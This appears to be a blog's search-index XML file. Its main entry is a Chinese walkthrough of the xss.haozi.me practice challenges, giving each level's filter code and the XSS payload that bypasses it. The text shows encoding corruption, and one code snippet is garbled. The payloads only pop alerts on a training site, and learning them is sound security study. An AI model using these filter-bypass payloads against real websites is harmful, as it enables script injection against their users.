<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>xxs.haozi.me æŒ‘æˆ˜</title>
      <link href="/2019/07/22/xxs-haozi-me-%E6%8C%91%E6%88%98/"/>
      <url>/2019/07/22/xxs-haozi-me-%E6%8C%91%E6%88%98/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p><code>&lt;script&gt;alert(123)&lt;/script&gt;</code><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g58ldgz0cij311y0h2wg9.jpg" alt=""></p><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>é—­åˆæ–‡æœ¬æ ‡ç­¾<br><code>&lt;/textarea&gt;&lt;script&gt;alert(123)&lt;/script&gt;&lt;textarea&gt;</code></p><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><p><code>return &#39;&lt;input type=&quot;name&quot; value=&quot;&#39; + input + &#39;&quot;&gt;&#39;</code> é—­åˆåé¢çš„<code>&quot;&gt;</code><br><code>123&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><p><code>/[()]/g</code><br>/g å…¨æ–‡æŸ¥æ‰¾å‡ºç°çš„æ‰€æœ‰åŒ¹é…å­—ç¬¦ å³æŸ¥æ‰¾[()]<br><code>input = input.replace(stripBracketsRe, &#39;&#39;)</code><br>å°†æŸ¥æ‰¾å‡ºæ¥çš„æ›¿æ¢ä¸º ç©º<br>ä½¿ç”¨onerroräº‹ä»¶: å‚è€ƒ:<a href="http://www.w3school.com.cn/jsref/event_onerror.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/jsref/event_onerror.asp</a><br><img src="" onerror="javascript:alert&#x28;&#x31;&#x29;"><br>ä¹Ÿå¯ä»¥ä¸åŠ javascript<br><img src="" onerror="alert&#x28;&#x31;&#x29;"></p><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p><code>const stripBracketsRe = /[()`]/g</code><br>å¢åŠ äº†å•å¼•å·è¿‡æ»¤ï¼ŒåŒæ ·å¯ä»¥ç”¨onerroräº‹ä»¶<br><img src="" onerror="alert&#x28;&#x31;&#x29;"></p><h1 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  input = input.replace(/--&gt;/g, 'ğŸ˜‚')</span><br><span class="line">  return '<span class="comment">&lt;!-- ' + input + ' --&gt;</span>'</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†<code>--&gt;</code>è¿‡æ»¤äº†ï¼Œè¿˜éœ€è¦ç»•è¿‡é—­åˆ<code>--&gt;</code><br>åœ¨htmlä¸­æ ‡ç­¾æ˜¯å¼±ç±»å‹ä½¿ç”¨â€“!&gt;åŒæ ·ä¹Ÿå¯ä»¥é—­åˆæ³¨é‡Š<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g58mjwmqxuj310v0aj0td.jpg" alt=""></p><p><code>--!&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p><h1 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h1><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> <span class="params">(input)</span></span> &#123;</span><br><span class="line">  <span class="built_in">input</span> = <span class="built_in">input</span>.replace(/auto|on.*=|&gt;/ig, <span class="string">'_'</span>)</span><br><span class="line">  <span class="keyword">return</span> `&lt;<span class="built_in">input</span> value=<span class="number">1</span> $&#123;<span class="built_in">input</span>&#125; <span class="built_in">type</span>=<span class="string">"text"</span>&gt;`</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¿½ç•¥å¤§å°å†™å…¨å±€åŒ¹é…:autoæˆ–è€…æ˜¯on=æˆ–è€…&gt;</p><p>æ›´æ”¹typeç±»å‹ä¸ºimg ç»§ç»­ä½¿ç”¨onerroräº‹ä»¶<br><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">type</span></span>=<span class="string">"image"</span> src=<span class="string">"xxx"</span> onerror</span><br><span class="line"></span><br><span class="line">         =<span class="string">"alert(1)"</span></span><br></pre></td></tr></table></figure></p><h1 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripTagsRe = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span></span><br><span class="line"></span><br><span class="line">  input = input.replace(stripTagsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;article&gt;<span class="subst">$&#123;input&#125;</span>&lt;/article&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨bodyçš„onloadäº‹ä»¶<br>onload é€šå¸¸ä½¿ç”¨äº <body> å…ƒç´ ä¸­ï¼Œç”¨äºåœ¨é¡µé¢å®Œå…¨è½½å…¥åæ‰§è¡ŒæŒ‡å®šçš„è„šæœ¬(åŒ…æ‹¬å›¾ç‰‡ï¼Œè„šæœ¬ï¼Œcssæ–‡ä»¶ç­‰)ã€‚</body></p><p><body onload="load()"> å°†æœ€åçš„&gt;å»æ‰ ç„¶åå›è½¦</body></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g59r4q8qioj30xr0glq60.jpg" alt=""></p><h1 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">src</span>) </span>&#123;</span><br><span class="line">  src = src.replace(<span class="regexp">/&lt;\/style&gt;/ig</span>, <span class="string">'/* \u574F\u4EBA */'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;src&#125;</span></span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸èƒ½è¾“å…¥<code>&lt;/style&gt;</code>ä½†å¯ä»¥è¾“å…¥<code>&lt;/style/&gt;</code><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g59rafxmfbj30vo0fu76q.jpg" alt=""></p><h1 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;input&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒ¹é…ç½‘å€ï¼Œå¯ä»¥è°ƒç”¨jsæ–‡ä»¶<br><code>https://www.segmentfault.com.haozi.me/j.js</code><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g59rfvccy8j30z40fiq5i.jpg" alt=""></p><h1 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2f'</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;escapeHtml(input)&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº† <code>/</code>ä½†æ˜¯æ²¡ä»€ä¹ˆç”¨<br><code>https://www.segmentfault.com.haozi.me/j.js</code></p><h1 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;h1&gt;<span class="subst">$&#123;inputoUpperCaset&#125;</span>&lt;/h1&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>toUpperCase() æ–¹æ³•å°†å­—ç¬¦ä¸²å°å†™å­—ç¬¦è½¬æ¢ä¸ºå¤§å†™ã€‚</p><p>åˆ©ç”¨srcåŠ è½½ä¸€ä¸ªå¤–éƒ¨jsæ–‡ä»¶<br><code>12&lt;/h1&gt;&lt;script src=&quot;https://www.segmentfault.com.haozi.me/j.js&quot;&gt;alert(1)&lt;/script&gt;4567</code><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g59s2b47l5j30z40gm77c.jpg" alt=""></p><h1 id="0x0c"><a href="#0x0c" class="headerlink" title="0x0c"></a>0x0c</h1><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  <span class="selector-tag">input</span> = <span class="selector-tag">input</span>.replace(/script/ig, <span class="string">''</span>)</span><br><span class="line">  <span class="selector-tag">input</span> = <span class="selector-tag">input</span>.toUpperCase()</span><br><span class="line">  return <span class="string">'&lt;h1&gt;'</span> + <span class="selector-tag">input</span> + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†scriptæ›¿æ¢ä¸ºç©ºï¼ŒåŒå†™ç»•è¿‡å³å¯<br><code>&lt;/h1&gt;&lt;scrscriptipt src=&quot;https://www.segmentfault.com.haozi.me/j.js&quot;&gt;alert(1)&lt;/scrscriptipt&gt;</code></p><h1 id="0x0D"><a href="#0x0D" class="headerlink" title="0x0D"></a>0x0D</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/[&lt;/"']/g</span>, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">          // alert('<span class="subst">$&#123;input&#125;</span>')</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>//</code>æ˜¯å•è¡Œæ³¨é‡Š å›è½¦å³å¯ç»•è¿‡<br><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alert(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function">--&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g59t3uv7amj30yy0engn7.jpg" alt=""></p><h1 id="0x0e"><a href="#0x0e" class="headerlink" title="0x0e"></a>0x0e</h1><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  <span class="selector-tag">input</span> = <span class="selector-tag">input</span>.replace(/&lt;([a-zA-Z])/g, <span class="string">'&lt;_$1'</span>)</span><br><span class="line">  <span class="selector-tag">input</span> = <span class="selector-tag">input</span>.toUpperCase()</span><br><span class="line">  return <span class="string">'&lt;h1&gt;'</span> + <span class="selector-tag">input</span> + <span class="string">'&lt;/h1&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°†&lt;åé¢çš„æ‰€æœ‰å­—ç¬¦å‰å…¨éƒ¨åŠ _,ä¹Ÿå°±æ˜¯å°†<script>è¿™æ ·çš„æ ‡ç­¾æ›¿æ¢ä¸º&lt;_SCRIPT&gt;<br>ç»è¿‡æŸ¥èµ„æ–™å‘ç°è¿™é‡Œçš„å…³é”®åœ¨äºtoUpperCase()ä¸ä»…è½¬æ¢è‹±æ–‡å­—æ¯ï¼Œä¹Ÿè½¬æ¢ä¸€äº›Unicodeå­—ç¬¦ï¼Œæ¯”å¦‚å°†Å¿ä¼ å…¥å°±å¯ä»¥è½¬æ¢ä¸ºSï¼Œè¿™æ ·å°±å¯ä»¥ç»•è¿‡ã€‚<br>ç›´æ¥æ„é€ &lt;Å¿cript&gt;alert(1)&lt;/Å¿cript&gt;ä¸è¡Œï¼Œå› ä¸ºjavascriptå¯¹å¤§å°å†™æ•æ„Ÿ,ï¼Œä¸è¯†åˆ«ALERT(1)<br>æ‰€ä»¥æ„é€ çš„payloadä¸º<code>&lt;Å¿cript src=&quot;https://www.segmentfault.com.haozi.me/j.js&quot;&gt;&lt;/script&gt;</code><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g59tmmizwlj30zk0egta1.jpg" alt=""></p><h1 id="0x0f"><a href="#0x0f" class="headerlink" title="0x0f"></a>0x0f</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2f;'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;img src onerror="console.error('<span class="subst">$&#123;escapeHtml(input)&#125;</span>')"&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é—­åˆ<code>&#39;)</code><br>payloadï¼š<code>&#39;);alert(&#39;1</code><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g59tpkp3o6j30ym0e3wfw.jpg" alt=""></p><h1 id="0x10"><a href="#0x10" class="headerlink" title="0x10"></a>0x10</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  window.data = <span class="subst">$&#123;input&#125;</span></span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥è¾“å…¥alert(1)<br>è¿˜æœ‰ä¸€ç§æ˜¯åŠ ä¸ªeval()å‡½æ•° //eval() å‡½æ•°å¯è®¡ç®—æŸä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶æ‰§è¡Œå…¶ä¸­çš„çš„ JavaScript ä»£ç ã€‚<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g59twtrn45j30yh0fw0v0.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g59ty2pa6cj30x80f2di0.jpg" alt=""></p><h1 id="0x11"><a href="#0x11" class="headerlink" title="0x11"></a>0x11</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeJs</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">String</span>(s)</span><br><span class="line">            .replace(<span class="regexp">/\\/g</span>, <span class="string">'\\\\'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'\\\''</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>)</span><br><span class="line">            .replace(<span class="regexp">/`/g</span>, <span class="string">'\\`'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'\\74'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'\\76'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'\\/'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\n/g</span>, <span class="string">'\\n'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\r/g</span>, <span class="string">'\\r'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\t/g</span>, <span class="string">'\\t'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\f/g</span>, <span class="string">'\\f'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\v/g</span>, <span class="string">'\\v'</span>)</span><br><span class="line">            <span class="comment">// .replace(/\b/g, '\\b')</span></span><br><span class="line">            .replace(<span class="regexp">/\0/g</span>, <span class="string">'\\0'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">  s = escapeJs(s)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">&lt;script&gt;</span></span><br><span class="line"><span class="string">  var url = 'javascript:console.log("<span class="subst">$&#123;s&#125;</span>")'</span></span><br><span class="line"><span class="string">  var a = document.createElement('a')</span></span><br><span class="line"><span class="string">  a.href = url</span></span><br><span class="line"><span class="string">  document.body.appendChild(a)</span></span><br><span class="line"><span class="string">  a.click()</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é—­åˆ<code>&quot;ï¼‰</code><br>payloadï¼š<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"),alert("</span><span class="number">1</span></span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g59ubczd43j30xe0ept9z.jpg" alt=""></p><h1 id="0x12"><a href="#0x12" class="headerlink" title="0x12"></a>0x12</h1><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// from alf.nu</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span> <span class="params">(s)</span> &#123;</span></span><br><span class="line">  s = s.replace(/<span class="string">"/g, '</span>\\<span class="string">"'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("</span><span class="string">' + s + '</span><span class="string">");&lt;/script&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payloadï¼š<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">alert(1);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br></pre></td></tr></table></figure></p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://blog.csdn.net/Ni9htMar3/article/details/77938899">https://blog.csdn.net/Ni9htMar3/article/details/77938899</a><br><a href="https://www.cnblogs.com/ChengWuyi/p/6847605.html">https://www.cnblogs.com/ChengWuyi/p/6847605.html</a></p></script></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>æ–°æµªå¾®åšæ–‡ç« æ‰¹é‡åˆ é™¤</title>
      <link href="/2019/07/22/%E6%96%B0%E6%B5%AA%E5%BE%AE%E5%8D%9A%E6%96%87%E7%AB%A0%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4/"/>
      <url>/2019/07/22/%E6%96%B0%E6%B5%AA%E5%BE%AE%E5%8D%9A%E6%96%87%E7%AB%A0%E6%89%B9%E9%87%8F%E5%88%A0%E9%99%A4/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"><br>ç™»å…¥å¾®åš<br>è¿›å…¥æˆ‘çš„ä¸“ä¸šï¼Œç„¶åæ‰“å¼€è°ƒè¯•å·¥å…·<br>è¾“å…¥:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">s.setAttribute(</span><br><span class="line">  <span class="string">'src'</span>,</span><br><span class="line">  <span class="string">'https://lib.sinaapp.com/js/jquery/2.0.3/jquery-2.0.3.min.js'</span></span><br><span class="line">);</span><br><span class="line">s.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">     setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> (!$(<span class="string">'a[action-type="feed_list_delete"]'</span>)) &#123;</span><br><span class="line">              $(<span class="string">'a.next'</span>).click();</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              $(<span class="string">'a[action-type="feed_list_delete"]'</span>)[<span class="number">0</span>].click();</span><br><span class="line">              $(<span class="string">'a[action-type="ok"]'</span>)[<span class="number">0</span>].click();</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">          $(<span class="string">'html, body'</span>).animate(&#123; <span class="attr">scrollTop</span>: $(<span class="built_in">document</span>).height() &#125;, <span class="string">'slow'</span>);</span><br><span class="line">     &#125;, <span class="number">500</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">document</span>.head.appendChild(s);</span><br></pre></td></tr></table></figure></p><p>å®‰å›è½¦å³å¯<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g58l6m3bhgj311y0h3n64.jpg" alt=""></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Google hack æŒ‡å—</title>
      <link href="/2019/07/22/Google-hack-%E6%8C%87%E5%8D%97/"/>
      <url>/2019/07/22/Google-hack-%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<p><meta name="referrer" content="no-referrer"><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g58k6ae5fuj30st0gkael.jpg" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Nmap å¸¸ç”¨å‚æ•°</title>
      <link href="/2019/07/19/Nmap-%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0/"/>
      <url>/2019/07/19/Nmap-%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0/</url>
      
